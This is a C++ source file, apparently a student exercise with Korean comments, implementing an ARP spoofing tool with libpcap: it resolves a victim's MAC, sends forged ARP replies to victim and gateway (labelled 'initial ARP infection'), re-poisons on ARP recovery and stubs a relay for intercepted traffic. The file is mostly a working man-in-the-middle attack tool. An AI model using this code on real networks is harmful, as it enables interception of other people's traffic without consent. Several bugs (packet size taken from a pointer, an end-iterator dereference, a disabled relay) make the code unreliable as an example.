#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h> // 네트워크 인터페이스 정보를 가져오기 위한 헤더 파일
#include "ethhdr.h"
#include "arphdr.h"
#include <map>

std::map<char*, char*> IP_GATE;
std::map<char*, Mac> TABLE2;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
char errbuf[PCAP_ERRBUF_SIZE];

unsigned char MY_MAC[6];
char MY_IP[INET_ADDRSTRLEN];

struct ipheader {
  unsigned char      iph_ihl:4, 	//IP header length
                     iph_ver:4;		//IP version
  unsigned char      iph_tos;		//Type of service
  unsigned short int iph_len;		//IP Packet length (data + header)
  unsigned short int iph_ident;		//Identification
  unsigned short int iph_flag:3,	//Fragmentation flags
                     iph_offset:13;	//Flags offset
  unsigned char      iph_ttl;		//Time to Live
  unsigned char      iph_protocol;	//Protocol type
  unsigned short int iph_chksum;	//IP datagram checksum
  struct  in_addr    iph_sourceip;	//Source IP address
  struct  in_addr    iph_destip;	//Destination IP address
};


int get_wlan_ip(char *ifname, char *ip) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        if (strncmp(ifa->ifa_name, ifname, 4) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &(sa->sin_addr), ip, INET_ADDRSTRLEN);

                freeifaddrs(ifaddr);
                return 0;
            }
        }
    }
    freeifaddrs(ifaddr);
    return -1;
}

int get_wlan_mac(char *ifname, unsigned char *mac) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (strncmp(ifa->ifa_name, ifname, 4) == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("socket");
                freeifaddrs(ifaddr);
                return -1;
            }

            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ-1);
            ifr.ifr_name[IFNAMSIZ-1] = '\0';

            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
                close(sock);
                freeifaddrs(ifaddr);
                return 0;
            } else {
                perror("ioctl");
                close(sock);
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;
}

int arp_packet(char* ifname, Ip sender_addr, Ip target_addr, Mac sender_mac) {
	char* dev = ifname;
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet1;

	packet1.eth_.dmac_ = Mac(sender_mac); //victim MAC
	packet1.eth_.smac_ = Mac(MY_MAC); //my MAC
	packet1.eth_.type_ = htons(EthHdr::Arp);
	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet1.arp_.pro_ = htons(EthHdr::Ip4);
	packet1.arp_.hln_ = Mac::SIZE;
	packet1.arp_.pln_ = Ip::SIZE;
	packet1.arp_.op_ = htons(ArpHdr::Request);//gateway
	packet1.arp_.tmac_ = sender_mac; //victim MAC
	packet1.arp_.tip_ = htonl(Ip(sender_addr)); //victim IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
	return 0;
}

int relay_packet(const u_char *packet, char* ifname, char* s_addr, char* d_addr)
{
	pcap_t* handle = pcap_open_live(ifname, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
		return -1;
	}
	struct EthHdr *eth = (struct EthHdr *)packet;
	struct ipheader *ip_header = (struct ipheader *)(packet + sizeof(struct EthHdr));
	eth->smac_ = Mac(MY_MAC); //my MAC FIX

	// packet config
	auto it = TABLE2.find(d_addr);
	if (it != TABLE2.end())
	{
		Mac destmac = it->second;
		char gate_ip[INET_ADDRSTRLEN];
		strcpy(gate_ip, IP_GATE.find(s_addr)->second);
		Mac gate_mac = TABLE2.find(gate_ip)->second;
		eth->dmac_ = Mac(gate_mac);
	}
	else// inbound
	{
		Mac destmac = it->second;
		eth->dmac_ = destmac;
	}

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
	return 0;
}

int arp_init(char* ifname, char* sender_addr, char* target_addr) {
	char* dev = ifname;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	get_wlan_mac(dev, MY_MAC);
	get_wlan_ip(dev, MY_IP);
	Mac sender_mac;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //victim MAC
	packet.eth_.smac_ = Mac(MY_MAC); //my MAC
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(MY_MAC); //my MAC
	packet.arp_.sip_ = htonl(Ip(MY_IP)); //my IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim MAC
	packet.arp_.tip_ = htonl(Ip(sender_addr)); //victim IP
	
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		struct EthHdr *eth = (struct EthHdr *)packet;
		if(eth->type() == 0x0806)
		{
			sender_mac = eth->smac();
			TABLE2.insert({sender_addr, sender_mac});// sender_addr 문자열을 포인터로 받아서 충돌이 나려니?
			break;
		}
	}//ok

	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	EthArpPacket packet1;
	packet1.eth_.dmac_ = sender_mac; //victim MAC
	packet1.eth_.smac_ = Mac(MY_MAC); //my MAC
	packet1.eth_.type_ = htons(EthHdr::Arp);
	packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet1.arp_.pro_ = htons(EthHdr::Ip4);
	packet1.arp_.hln_ = Mac::SIZE;
	packet1.arp_.pln_ = Ip::SIZE;
	packet1.arp_.op_ = htons(ArpHdr::Request);
	packet1.arp_.smac_ = Mac(MY_MAC); //my MAC
	packet1.arp_.sip_ = htonl(Ip(target_addr)); //gateway
	packet1.arp_.tmac_ = sender_mac; //victim MAC
	packet1.arp_.tip_ = htonl(Ip(sender_addr)); //victim IP
	printf("%s, %s", sender_addr, target_addr);
	
	int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
	if (res1 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
	}
	pcap_close(handle);
	return 0;
}

int main(int argc, char* argv[])
{
	char ifname[100];
	strcpy(ifname, argv[1]);
	get_wlan_mac(ifname, MY_MAC);
	get_wlan_ip(ifname, MY_IP);

	char sender[100][100];
	char target[100][100];
	int s_index = 0;
	int t_index = 0;

	for(int i=2; i<argc; i++)
	{
		//printf("%d\n", i);
		if(i % 2== 0)
		{
            strncpy(sender[s_index], argv[i], 15);
            sender[s_index][15] = '\0';
            //printf("sender: %s\n", sender[s_index]);
            s_index++;
		}
		else
		{
			strncpy(target[t_index], argv[i], 15);
            target[t_index][15] = '\0';
            //printf("target: %s\n", target[t_index]);
            t_index++;
		}
	}


	//초기 ARP 감염
	for(int i=0; i < s_index; i++)
	{
		IP_GATE.insert({sender[i], target[i]});// sender_addr 변경해야함 이거 충돌날 가능성 큼
		arp_init(ifname, sender[i], target[i]);
		arp_init(ifname, target[i], sender[i]);
	}

	pcap_t* pcap = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", ifname, errbuf);
		return -1;
	}

	while (true) { //패킷캡쳐
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		struct EthHdr *eth = (struct EthHdr *)packet;
		if(eth->type() == 0x0806)//arp check packet
		{
			printf("arp recover packet send!!\n");
			struct ipheader *ip_header = (struct ipheader *)(packet + sizeof(struct EthHdr));
			Mac sender_mac = eth->smac_;
			// char sender_addr[INET_ADDRSTRLEN];
			// strncpy(sender_addr, inet_ntoa(ip_header->iph_sourceip), INET_ADDRSTRLEN);
			// char target_addr[INET_ADDRSTRLEN];
			// strncpy(target_addr, inet_ntoa(ip_header->iph_destip), INET_ADDRSTRLEN);
			Ip sender_addr = Ip(ntohl(ip_header->iph_sourceip.s_addr));
			Ip target_addr = Ip(ntohl(ip_header->iph_destip.s_addr));
			printf("ip addr : %s\n", static_cast<std::string>(sender_addr).c_str());
			printf("ip addr : %s\n", static_cast<std::string>(target_addr).c_str());
			arp_packet(ifname, sender_addr, target_addr, sender_mac);
		}
		else if(eth->type() == 0x0800)
        {
			printf("this is relay\n");	
			struct ipheader *ip_header = (struct ipheader *)(packet + sizeof(struct EthHdr));
            Mac s_mac = eth->smac_;
			Ip s_addr = Ip(ntohl(ip_header->iph_sourceip.s_addr));
			Ip d_addr = Ip(ntohl(ip_header->iph_destip.s_addr));
			//relay_packet(packet, ifname, s_addr, d_addr);
        }
	}
	return 0;
}
